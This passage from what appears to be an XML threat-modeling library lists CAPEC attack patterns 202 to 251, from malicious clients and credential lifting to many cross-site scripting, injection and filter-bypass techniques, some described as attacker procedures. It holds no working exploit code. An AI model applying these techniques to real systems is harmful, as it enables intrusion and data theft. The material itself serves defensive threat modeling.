  <description>An attacker creates an XML document that with an external entity reference. External entity references can take the form of &lt;!ENTITY name system &quot;uri&quot;&gt; tags in a DTD. Because processors may not validate documents with external entities, there may be no checks on the nature of the reference in the external entity. This can allow an attacker to open arbitrary files or connections. For example, the following DTD would attempt to open the /dev/tty device:</description>
</threat>
<threat label="CAPEC-202" name="Create Malicious Client" type="Standard" reference="CAPEC">
  <description>An attacker creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures. For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an attacker can take advantage of these assumptions to abuse service functionality. For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the attacker uses a malicious client, however, the attacker could ignore the server input and declare any total price. Likewise, an attacker could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance.Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an attacker can exploit.This attack differs from most other forms of identity spoofing in that the attacker is not attempting to impersonate a specific user or device. Instead, the attacker attempts to impersonate a class of applications, namely the client applications of a service. As such, the attacker is not violating the service's trust in an identity, but its trust in expected behavior.</description>
</threat>
<threat label="CAPEC-203" name="Manipulate Application Registry Values" type="Standard" reference="CAPEC">
  <description>An attacker manipulates the registry values used by an application to perform a variety of possible attacks. Many applications utilize registries to store configuration and service information. As such, attacks that manipulate these registries can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of the targeted application. It is important to note that &quot;registry&quot; does not only refer to the Microsoft Windows Registry, but to any registry used by an application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes undertaken as part of another attack; for example, a path traversal (inserting relative path modifiers) or buffer overflow (enlarging a registry value beyond an application's ability to store it), but given the long term usage of many registry values, the registry manipulation could be its own end.</description>
</threat>
<threat label="CAPEC-204" name="Lifting cached, sensitive data embedded in client distributions (thick or thin)" type="Standard" reference="CAPEC">
  <description>An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.</description>
</threat>
<threat label="CAPEC-205" name="Lifting credential(s)/key material embedded in client distributions (thick or thin)" type="Standard" reference="CAPEC">
  <description>An attacker examines a target application's code or configuration files to find credential or key material that has been embedded within the application or its files. Many services require authentication with their users for the various purposes including billing, access control or attribution. Some client applications store the user's authentication credentials or keys to accelerate the login process. Some clients may have built-in keys or credentials (in which case the server is authenticating with the client, rather than the user). If the attacker is able to locate where this information is stored, they may be able to retrieve these credentials. The attacker could then use these stolen credentials to impersonate the user or client, respectively, in interactions with the service or use stolen keys to eavesdrop on nominally secure communications between the client and server.Attacker identifies client components to extract information from. These may be configuration files, local databases, binary executables, class files, shared libraries (e.g., DLLs), or other machine code.Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.Package listing. The attacker uses a package manifest provided with the software installer, or the file system itself, to identify component files suitable for attack.Proprietary or sensitive data is stored in a location ultimately distributed to end users.No sensitive data seems to be stored in the user’s client. The storage could be done after the first authentication or execution of the thick client.Access to binary code is not realistic. For example, in a client-server environment, binary code on the server is presumed to be inscrutable to an attacker unless another vulnerability exposes it.The attacker then uses a variety of techniques, such as monitoring, sniffing, reverse-engineering, cryptanalysis to extract the sensitive information and its associated use by the application.API Profiling. The attacker monitors the software's use of registry keys or other storage locations that can contain sensitive information.Execution in debugger. The attacker attaches a debugger to the application to monitor authentication process and retrieve important application steps (reverse algorithms) along system calls, network communication, etc.Cryptanalysis. The attacker performs cryptanalysis to identify data in the client component which may be cryptographically significant. (Key material frequently stands out as very high entropy data when compared to other mundane data). Given cryptographically significant data, other analyses are performed (e.g., length, internal structure, etc.) to determine potential algorithms (RSA, ECC, AES, etc.). This process proceeds until the attacker reaches a conclusion about the significance and use of the data.Sensitive credentials data are used and embedded inside the client-accessible artifacts.</description>
</threat>
<threat label="CAPEC-206" name="Lifting signing key and signing malicious code from a production environment" type="Standard" reference="CAPEC">
  <description>The attacker extracts credentials used for code signing from a production environment and uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the attacker has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the attacker to execute arbitrary code on the victim's computer.</description>
</threat>
<threat label="CAPEC-207" name="Removing Important Functionality from the Client" type="Standard" reference="CAPEC">
  <description>An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.The attacker probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.The attacker probes by exploring an application's functionality and its underlying mapping to server-side components.The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.The server relies on some functionality on the client for correct and secure operation.The server does not rely on any functionality on the client.The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.The attacker reverse engineers the client-side code to determine which functionality to disable or remove.Once the functionality has been determined, the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.The attacker disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server.By pass the authorization check</description>
</threat>
<threat label="CAPEC-208" name="Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements" type="Standard" reference="CAPEC">
  <description>An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.</description>
</threat>
<threat label="CAPEC-209" name="Cross-Site Scripting Using MIME Type Mismatch" type="Standard" reference="CAPEC">
  <description>An attacker creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. Some browsers will detect that the specified MIME type of the file does not match the actual type of the content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the attacker's script may run on the target unsanitized. For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked. In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters. In a cross-site scripting attack, the attacker tricks the victim into accessing a URL that uploads a script file with an incorrectly specified MIME type. If the victim's browser switches to the appropriate interpreter without filtering, the attack will execute as a standard XSS attack, possibly revealing the victim's cookies or executing arbitrary script in their browser.</description>
</threat>
<threat label="CAPEC-21" name="Exploitation of Session Variables, Resource IDs and other Trusted Credentials" type="Standard" reference="CAPEC">
  <description>Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queueing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so.Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes &quot;trust&quot; other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points.Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers.The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.Using a variety of methods, until one is found that applies to the target system. the attacker probes for credentials, session tokens, or entry points that bypass credentials altogether.Spider all available pagesAttack known bad interfacesSession IDs are usedOpen access points exist that use no user IDs or passwords, but determine authorization based on message contentAn attacker fetches many samples of a session ID. This may be through legitimate access (logging in, legitimate connections, etc) or just systematic probing.An attacker makes many anonymous connections and records the session IDs assigned.An attacker makes authorized connections and records the session tokens or credentials issued.An attacker gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connections from it, attempting to gain the same privileges as a trusted system.Trust in the system is based on IP address, MAC address, network locality, or other general network characteristic.Web applications use session IDsNetwork systems issue session IDs or connection IDsAn attacker can use successful experiments to impersonate an authorized user or systemBad data can be injected into the system by an attacker.Enables attacker to impersonate another user and access commands and data (and log behavior to audit logs) on their behalf.</description>
</threat>
<threat label="CAPEC-211" name="Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior" type="Detailed" reference="CAPEC">
  <description>An attacker utilizes web tools such as Mozilla's GreaseMonkey in order to modify the behavior of web applications, potentially violating assumptions that a server makes about web-based clients. Web-based client applications may use code such as JavaScript in order to populate fields submitted to a server or to ensure a correct order of operations. However, tools such as GreaseMonkey and Firebug can re-write a web site's JavaScript locally before it is interpreted on a client browser. As a result, the processing activities on the client may not conform to the server's expectations. For example, a web-based client application might use JavaScript to fill in the identity of the application's user based on other information that is available. However, if the attacker is utilizing a web tool to change the JavaScript of the web client, they could insert any identity that they wished, thus allowing them to impersonate other users. Depending on the client-functionality that the attacker is affecting, the attacker could impersonate other users, change purse-logic, remove client-based filters, and otherwise violate server expectations.</description>
</threat>
<threat label="CAPEC-213" name="Directory Traversal" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-214" name="Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping" type="Detailed" reference="CAPEC">
  <description>An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes any stack traces produced by error messages. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to cause the targeted application to return an error including a stack trace, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. The strack trace enumerates the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information.</description>
</threat>
<threat label="CAPEC-215" name="Fuzzing and observing application log data/errors for application mapping" type="Standard" reference="CAPEC">
  <description>An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.The attacker uses fuzzing tools to send random malformed messages to web server and observes for server’s log or error message.The attacker uses fuzzing tools to send random malformed messages to web server and observes for server’s log or error message.The application’s log or error messages contain sensitive information.There is no desired error message returned. This does not mean the application will not disclose sensitive information through error messages.Attacker usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off in obfuscating the attack.Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.If the application rejects the large amount of fuzzing messages from the same host machine, the attacker needs to hide the attacks by changing the IP addresses or other credentials.The application errors messages/logs contain sensitive information mapping the application.The application errors messages/logs have no sensitive information about the application.The impact of activation is an error condition that reveals sufficient information for further application mapping to the attacker.</description>
</threat>
<threat label="CAPEC-217" name="Exploiting Incorrectly Configured SSL Security Levels" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-218" name="Spoofing of UDDI/ebXML Messages" type="Detailed" reference="CAPEC">
  <description>An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.</description>
</threat>
<threat label="CAPEC-219" name="XML  Routing Detour Attacks" type="Standard" reference="CAPEC">
  <description>An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.Using command line or an automated tool, an attacker records all instances of web services to process XML requests.Use automated tool to record all instances to process XML requests or find exposed WSDL.Use tools to crawl WSDLThe URL processes XML requests.The application does not accept XML requests.Inspect instance to see whether the XML processing has multiple stages or not.Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.The SOAP message has multiple stage processing.The SOAP message does not have intermediate nodes.The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP messageInformation Leakage</description>
</threat>
<threat label="CAPEC-22" name="Exploiting Trust in Client (aka Make the Client Invisible)" type="Meta" reference="CAPEC">
  <description>An attack of this type exploits a programs' vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client.An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client.There are numerous variations of this type of attack.</description>
</threat>
<threat label="CAPEC-220" name="Client-Server Protocol Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.</description>
</threat>
<threat label="CAPEC-221" name="External Entity Attack" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-222" name="iFrame Overlay" type="Standard" reference="CAPEC">
  <description>In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attacker's malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.The attacker crafts a malicious iFrame overlay page.The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.Overlay capabilities are enabled in the browser.The target website implements protection against iFrame Overlay (frame busting).Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.Trick the victim to the malicious site through a cross-site scripting attack.The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.Hide action controls over very commonly used functionality.Hide action controls over very psychologically tempting content.</description>
</threat>
<threat label="CAPEC-226" name="Session Credential Falsification through Manipulation" type="Detailed" reference="CAPEC">
  <description>An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.</description>
</threat>
<threat label="CAPEC-227" name="Denial of Service through Resource Depletion" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-228" name="Resource Depletion through DTD Injection in a SOAP Message" type="Detailed" reference="CAPEC">
  <description>An attacker utilizes a SOAP message to send the target a crafted DTD which consumes excessive resources when parsed on the end system resulting in resource depletion. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion. In this attack, the XML parser is part of a service that processes SOAP messages.</description>
</threat>
<threat label="CAPEC-229" name="XML Attribute Blowup" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-23" name="File System Function Injection, Content Based" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits the host's trust in executing remote content including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the attacker and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The attacker exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the attacker knows the standard handling routines and can identify vulnerabilities and entry points they can be exploited by otherwise seemingly normal content. Once the attack is executed, the attacker's program can access relative directories such as C:\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-230" name="Recursive Payloads Sent to XML Parsers" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-231" name="Oversized Payloads Sent to XML Parsers" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-234" name="Hijacking a privileged process" type="Standard" reference="CAPEC">
  <description>An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of prevelege in order to execute their own code. Processes can be hijacked through inproper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.</description>
</threat>
<threat label="CAPEC-235" name="Implementing a callback to system routine (old AWT Queue)" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-236" name="Catching exception throw/signal from privileged block" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-237" name="Calling Signed Code From Another Language Within A Sandbox Allow This " type="Standard" reference="CAPEC">
  <description>The attacker may submit a malicious signed code from another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behave. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.The target application allows calling signed code from another language within a sandbox.The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.The standard library of the sandbox has some cross code security weaknesses.The attacker tries to craft malicious signed code from another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.The attacker tries to explore the security weaknesses by calling malicious signed code from another language allowed by the sandbox.The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries.</description>
</threat>
<threat label="CAPEC-238" name="Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege" type="Detailed" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-239" name="Subversion of authorization checks: cache filtering, programmatic security, etc." type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-24" name="Filter Failure through Buffer Overflow" type="Detailed" reference="CAPEC">
  <description>In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. lets the user input into the system unfiltered).The attacker surveys the target application, possibly as a valid and authenticated userSpidering web sites for inputs that involve potential filteringBrute force guessing of filtered inputsSoftware messages (e.g., &quot;the following characters are not allowed...&quot;) indicate that filtered inputs are present in the software. (Application uses predefined inputs (e.g., drop-down lists, radio buttons, selection lists, etc.)Managed code (e.g., .NET, Java) is likely, based on URLs.Managed code (e.g., .NET, Java) is likely, based on files found in software.Java code is likely, based on standard disclaimers (e.g., &quot;This software contains Java from Sun....&quot;). Such declarations are frequent on commercial software that is based on Java.Java code is likely, based on one of the other indicators, but it could contain Java Native Interface (JNI) code. This is indicated by the inclusion of DLLs or equivalent binary object code with Java code.Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.Brute force attack through black box penetration test tool.Fuzzing of communications protocolsManual testing of possible inputs with attack data.Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.Check Log files. An attacker with access to log files can look at the outcome of bad input.An attacker writes a script to consistently induce the filter failure.DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.Failure mode of the software (perhaps as a safety mechanism) includes exiting or ceasing to respond.Failures do not involve stopping services, rejecting inputs or connections, and do not affect other simultaneous users of the software.Try to feed very long data as input to the program and watch for any indication that a failure has occurred. Then see if input has been admitted into the system.Some dynamic analysis tools may be helpful here to determine whether failure can be induced by feeding overly long inputs strings into the system.Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.An attacker may temporally space out their probes.An attacker may perform probes from different IP addresses.Since no input validation is effectively performed in this situation, the impact of the attack may be a complete compromise of confidentiality, integrity, accountability and availability services.</description>
</threat>
<threat label="CAPEC-240" name="Resource Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-241" name="Code Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-242" name="Script Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-243" name="Cross-Site Scripting in Attributes" type="Detailed" reference="CAPEC">
  <description>The attacker inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.</description>
</threat>
<threat label="CAPEC-244" name="Cross-Site Scripting via Encoded URI Schemes " type="Standard" reference="CAPEC">
  <description>An attack of this type exploits the ability of most browsers to interpret “data”, “javascript” or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.URL parameters are used by the application or the browser (DOM) in a context that is originally used for storing URL (anchor’s “href”, script’s “src”, etc.)Using URL rewriting, parameters may be part of the URL path.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.Use a proxy tool to record results of manual input of XSS probes in known URLs.Input parameters are printed back in a URL placeholder that support different URI schemes such as HREF, SRC, and other attributesNothing is returned to the web page. The payload may be a stored to be served later. The unique identifier from the probe helps to trace the flow of the possible XSSAs the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the websiteDevelop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Client web browser may be used to steal session data, passwords, cookies, and other tokens.</description>
</threat>
<threat label="CAPEC-245" name="Cross-Site Scripting Using Doubled Characters, e.g. %3C%3Cscript" type="Detailed" reference="CAPEC">
  <description>The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the &lt; before a script command, (&lt;&lt;script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.</description>
</threat>
<threat label="CAPEC-246" name="Cross-Site Scripting Using Flash" type="Standard" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-247" name="Cross-Site Scripting with Masking through Invalid Characters in Identifiers" type="Detailed" reference="CAPEC">
  <description>The attacker inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.</description>
</threat>
<threat label="CAPEC-248" name="Command Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-249" name="Character Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-25" name="Forced Deadlock" type="Standard" reference="CAPEC">
  <description>This attack attempts to trigger and exploit a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock condition are not easy to detect.The attacker initiates an exploratory phase to get familiar with the system.The attacker triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.If the target program has a deadlock condition, the program waits indefinitevely resulting in a denial of service.The attacker can probe by trying to hold resources and call APIs which are directly using the same resources.The attacker may try to find actions (threads, processes) competing for the same resources.</description>
</threat>
<threat label="CAPEC-250" name="XML Injection" type="Meta" reference="CAPEC">
  <description></description>
</threat>
<threat label="CAPEC-251" name="Local Code Inclusion" type="Standard" reference="CAPEC">
